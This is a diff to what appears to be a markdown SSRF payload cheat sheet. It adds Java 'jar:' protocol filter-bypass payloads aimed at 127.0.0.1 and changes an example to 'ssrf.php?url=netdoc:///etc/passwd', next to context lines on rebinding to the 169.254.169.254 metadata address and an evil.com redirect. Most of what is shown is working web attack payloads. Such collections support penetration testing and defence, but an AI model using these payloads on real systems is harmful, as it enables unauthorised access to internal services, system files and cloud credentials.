@@ -247,6 +247,15 @@ For example to rotate between 1.2.3.4 and 169.254-169.254, use the following dom
 make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
 ```
 
+### Bypassing using jar protocol (java only)
+
+```powershell
+jar:scheme://domain/path!/ 
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+```
+
 ## SSRF exploitation via URL Scheme
 
 ### File 
@@ -374,8 +383,8 @@ Content of evil.com/redirect.php:
 Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
 
 ```powershell
-ssrf.php?url=gopher://127.0.0.1:4242/DATA
-```
+ssrf.php?url=netdoc:///etc/passwd
+``` 
 
 ## SSRF exploiting WSGI
 
